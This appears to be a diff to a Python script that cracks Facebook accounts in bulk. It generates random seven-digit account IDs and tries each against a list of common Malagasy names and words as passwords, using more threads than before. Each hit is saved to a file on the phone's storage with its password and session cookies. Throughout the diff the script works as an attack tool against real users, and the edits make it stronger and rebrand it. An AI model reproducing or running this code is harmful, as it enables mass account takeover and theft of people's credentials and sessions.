@@ -433,7 +433,7 @@ def pak():
                 for nmbr in range(limit):
                         nmp = ''.join(random.choice(string.digits) for _ in range(7))
                         user.append(nmp)
-                with tred(max_workers=30) as ennic:     
+                with tred(max_workers=45) as ennic:     
                         clear()
                         
                         tl = str(len(user))
@@ -443,7 +443,7 @@ def pak():
                         linex()
                         for psx in user:
                                 ids = code+psx
-                                passlist = [psx,ids,'fitiavana','narindra','mamako','sarindra','malala','fandresena','vadiko','niaina','nomena','fitahina','mahery','mihary','tanjona','nekena','tsiresy','nilaina','sarobidy','Sarobidy','nirina','Nirina','niaina','Niaina','mamiko','Mamiko','jesosy','Jesosy','tahina','Tahina','badoda','Badoda']
+                                passlist = [psx,ids,'fitiavana','nirina','mamiko','malalako','malala','mamako','vadiko','niaina','randria','anjara','solofo','safidy','nantenaina','sarobidy','faniry','nomena','tolotra','tanjona','anjara','rakoto','sitraka','zanako','felana','tantely','sarika','papako','milely','fanantenana','valisoa','lalatiana','niaina','faniry','nilaina','mihary','mahery','Mahery','fanomezana','sitraka','avotra','nantenaina','tahina','fitahina','fifaliana','fitahiana','anjara']
                                 ennic.submit(rndm,ids,passlist)
                 print('\033[1;37m')
                 linex()
@@ -632,7 +632,7 @@ def api(ids,names,passlist):
                                         print('\r\r\033[1;32m [LXT -OK] '+ids+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print("\r\r\033[1;33m Cookie: "+coki)
-                                        open('/sdcard/Safidy.txt','a').write(str(ids)+'|'+pas+'|'+coki+'\n')
+                                        open('/sdcard/MARC.txt','a').write(str(ids)+'|'+pas+'|'+coki+'\n')
                                         #open('/sdcard/Steve-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
@@ -733,11 +733,11 @@ def api1(ids,names,passlist):
                                 if str(uid) in oks:
                                         break
                                 else:
-                                        print('\r\r\033[1;32m [Safidy-OK] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [MARV-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print("\r\r\033[1;33m Cookie: "+coki)
-                                        open('/sdcard/Safidy.txt','a').write(str(uid)+'|'+pas+ '|' +coki+'\n')
-                                        #open('/sdcard/Safidy.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        open('/sdcard/MARC.txt','a').write(str(uid)+'|'+pas+ '|' +coki+'\n')
+                                        #open('/sdcard/MARC.txt','a').write(str(uid)+'|'+pas+'\n')
                                         oks.append(str(uid))
                                         break
                         elif 'mbasic.facebook.com' in po['error']['message']:
@@ -852,11 +852,11 @@ def rndm(ids,passlist):
                                 if str(uid) in oks:
                                         break
                                 else:
-                                        print('\r\r\033[1;32m [Safidy-OK] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [MARC-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print("\r\r\033[1;37m Cookie: "+coki)
-                                        open('/sdcard/Safidy.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
-                                    #    open('/sdcard/Safidy-OK.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        open('/sdcard/MARC.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
+                                    #    open('/sdcard/Steve-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                         oks.append(str(uid))
                                         break
                         elif 'www.facebook.com' in po['error']['message']:
